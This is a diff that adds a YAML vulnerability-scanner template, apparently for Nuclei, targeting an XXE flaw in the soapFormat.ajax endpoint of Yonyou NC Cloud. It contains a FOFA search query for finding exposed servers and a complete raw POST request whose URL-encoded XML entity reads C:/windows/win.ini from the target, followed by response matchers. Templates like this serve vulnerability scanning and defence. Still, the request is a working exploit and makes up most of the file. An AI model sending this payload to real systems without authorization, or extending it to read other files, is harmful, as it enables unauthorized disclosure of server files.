@@ -1,0 +1,37 @@
+id: NC_Cloud_soapFormat
+info:
+  name: 用友NC Cloud soapFormat XXE
+  author: mike
+  severity: info
+  description: NC Cloud是用友推出的大型企业数字化平台。用友网络科技股份有限公司NC Cloud soapFormat接口存在XXE漏洞。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+http:
+  - raw:
+      - |
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 366
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        msg=%3C%21DOCTYPE+foo%5B%3C%21ENTITY+xxe1two+SYSTEM+%22file%3A%2F%2F%2FC%3A%2F%2Fwindows%2Fwin.ini%22%3E+%5D%3E%3Csoap%3AEnvelope+xmlns%3Asoap%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%3E%3Csoap%3ABody%3E%3Csoap%3AFault%3E%3Cfaultcode%3Esoap%3AServer%26xxe1two%3B%3C%2Ffaultcode%3E%3C%2Fsoap%3AFault%3E%3C%2Fsoap%3ABody%3E%3C%2Fsoap%3AEnvelope%3E
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "faultcode"
